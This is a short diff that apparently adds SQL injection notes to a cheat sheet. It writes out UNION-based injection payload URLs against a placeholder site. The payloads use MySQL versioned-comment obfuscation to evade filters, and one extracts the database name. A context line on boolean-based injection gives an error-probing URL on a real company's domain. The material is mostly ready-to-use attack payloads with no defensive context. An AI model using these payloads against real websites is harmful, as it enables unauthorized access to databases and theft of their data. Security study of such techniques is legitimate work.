@@ -1,3 +1,6 @@
+http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3,4,5 —
+DUPM DATABASE:
+http://domain.com/REDACTED/news.php?id=13 AND 0 /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,database(),3,4,5 —
 
 Getting two states for boolean based sql injection
     Error - https://www.innogames.com/'
